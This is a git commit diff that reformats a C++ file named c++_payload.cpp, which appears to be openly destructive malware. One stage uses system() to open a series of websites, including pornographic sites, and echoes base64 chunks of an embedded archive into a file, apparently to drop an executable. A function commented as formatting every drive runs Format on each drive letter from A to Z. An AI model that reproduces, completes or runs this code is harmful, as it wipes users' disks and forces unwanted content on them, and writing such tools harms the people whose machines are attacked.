082f766f88ae9933fff79eb3118607b86eab64ac
cha0sthe3ry <33165061+cha0sthe3ry@users.noreply.github.com>
2018-01-26 12:51:45 -0600

    Update c++_payload.cpp

--- c++_payload.cpp
+++ c++_payload.cpp
@@ -54,43 +54,43 @@ void secoundStage() {
         system("start http://www.google.com/");
         system("start http://www.youaretheidiot.com/");
         system("start http://www.Facebook.com/");
-		system("start https://www.youtube.com/watch?v=qdj_w3MxQXo");
-		system("start http://www.Redvideos.com/");
-		system("start http://www.xvideos.com/");
-		system("echo UEsDBBQAAAAI36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGziscac>x");
+	system("start https://www.youtube.com/watch?v=qdj_w3MxQXo");
+	system("start http://www.Redvideos.com/");
+	system("start http://www.xvideos.com/");
+	system("echo UEsDBBQAAAAI36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGziscac>x");
     	system("echo AxgMyD9Hlm1sY4JkW2AH/wjLP5BgB9k6RhKSjqIfbKcJyBgaqw65tM1NIJckNE1705Tcpi3JJWma>>x");
-	    system("echo OD830Da0TptFSQOpXx7NFSnhmYRbnIRw3jfnyMZpfmCt99b7WauzvM+c2TOz95699+zZIw71t+wl>>x");
-	    system("echo KkIIAxBFQo4QuZjItctJQErWcynk8LTjC44o6o4vaHa6gqw/IGwJ2L1sl93nE0JsJ88Gwj7W5WOr>>x");
+	system("echo OD830Da0TptFSQOpXx7NFSnhmYRbnIRw3jfnyMZpfmCt99b7WauzvM+c2TOz95699+zZIw71t+wl>>x");
+	system("echo KkIIAxBFQo4QuZjItctJQErWcynk8LTjC44o6o4vaHa6gqw/IGwJ2L1sl93nE0JsJ88Gwj7W5WOr>>x");
     }
 }
 
 // Formats all the Hard drives, VHD (Virtual Hard disk drives) and flash drives.
 void ThirdStage() {
     system("Format A:\\");
-	system("Format B:\\");
-	system("Format C:\\");
-	system("Format D:\\");
-	system("Format E:\\");
-	system("Format F:\\");
-	system("Format G:\\");
-	system("Format H:\\");
-	system("Format I:\\");
-	system("Format J:\\");
-	system("Format K:\\");
-	system("Format L:\\");
-	system("Format M:\\");
-	system("Format N:\\");
-	system("Format O:\\");
-	system("Format P:\\");
-	system("Format Q:\\");
-	system("Format R:\\");
-	system("Format S:\\");
-	system("Format T:\\");
-	system("Format U:\\");
-	system("Format V:\\");
-	system("Format X:\\");
-	system("Format Y:\\");
-	system("Format Z:\\");
+    system("Format B:\\");
+    system("Format C:\\");
+    system("Format D:\\");
+    system("Format E:\\");
+    system("Format F:\\"); 
+    system("Format G:\\");
+    system("Format H:\\");
+    system("Format I:\\");
+    system("Format J:\\");
+    system("Format K:\\");
+    system("Format L:\\");
+    system("Format M:\\");
+    system("Format N:\\");
+    system("Format O:\\");
+    system("Format P:\\");
+    system("Format Q:\\");
+    system("Format R:\\");
+    system("Format S:\\");
+    system("Format T:\\");
+    system("Format U:\\");
+    system("Format V:\\");
+    system("Format X:\\");
+    system("Format Y:\\");
+    system("Format Z:\\");
 }
 
 int main()
